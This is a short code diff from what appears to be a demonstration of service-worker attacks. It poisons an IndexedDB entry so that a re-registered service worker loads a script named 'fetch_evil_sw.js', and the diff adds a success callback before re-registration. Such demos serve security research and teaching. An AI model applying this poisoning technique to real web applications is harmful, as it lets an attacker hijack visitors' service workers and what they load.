@@ -44,8 +44,10 @@
                          alert('URL Modified!!. Reload Page')
                      }
                      var store = txn.objectStore('urls')
-                     store.put({'id':'report_url', 'url':'https://demopwa.github.io/SW_Attacks/IndexDBPoisoning/fetch_evil_sw.js'})
-                      if('serviceWorker' in navigator) {
+                     var db_op_req = store.put({'id':'report_url', 'url':'https://demopwa.github.io/SW_Attacks/IndexDBPoisoning/fetch_evil_sw.js'})
+                     db_op_req.onsuccess = function(event) { 
+			if('serviceWorker' in navigator) 
+			{
 			      navigator.serviceWorker.getRegistrations().then(function(registrations) {
 				    for(let registration of registrations) {
 					    registration.unregister()
@@ -55,7 +57,8 @@
 			      });
 			      
 			      navigator.serviceWorker.register('./sw.js');
-		      };
+		      	};
+		    }
               }
           }
 	  
